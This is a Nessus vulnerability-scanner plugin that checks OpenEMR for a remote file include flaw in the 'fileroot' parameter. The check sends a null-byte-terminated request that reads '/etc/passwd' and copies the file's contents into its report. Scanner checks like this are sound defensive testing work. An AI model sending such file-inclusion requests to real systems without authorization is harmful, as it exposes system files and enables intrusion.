#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to a
remote file include attack. 

Description :

The remote host is running OpenEMR, a web-based medical records
application written in PHP. 

The version of OpenEMR installed on the remote host fails to sanitize
input to the 'fileroot' parameter before using it in the
'contrib/forms/evaluation/C_FormEvaluation.class.php' script to
include PHP code.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit this flaw
to view arbitrary files on the remote host or to execute arbitrary PHP
code, possibly taken from third-party hosts. 

See also :

http://milw0rm.com/exploits/1886

Solution :

Disable PHP's 'register_globals' setting as the application does not
require it. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21675);
  script_version("$Revision: 1.1 $");

  script_name(english:"OpenEMR fileroot Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file using OpenEMR");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/openemr", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/contrib/forms/evaluation/C_FormEvaluation.class.php?",
      "fileroot=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/library/classes/Controller\.class\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (contents)
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
